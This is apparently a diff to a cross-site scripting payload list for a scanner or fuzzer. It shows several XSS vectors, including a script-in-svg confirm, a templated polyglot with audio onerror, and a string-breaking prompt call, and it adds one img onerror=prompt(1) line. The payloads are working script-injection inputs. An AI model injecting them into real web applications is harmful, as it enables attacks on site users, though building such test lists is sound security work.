@@ -21,3 +21,4 @@
 <svg><script>//&NewLine;confirm(1);</script </svg>
 '''"'-function(){{{callback}}}()-">\"><scrIpt>{callback}</scrIpt><aUdio src=x oNerror={callback}><"-'-function(){{{callback}}}()"'''
 ";a=prompt,a()//
+"><img src=x onerror=prompt(1);>
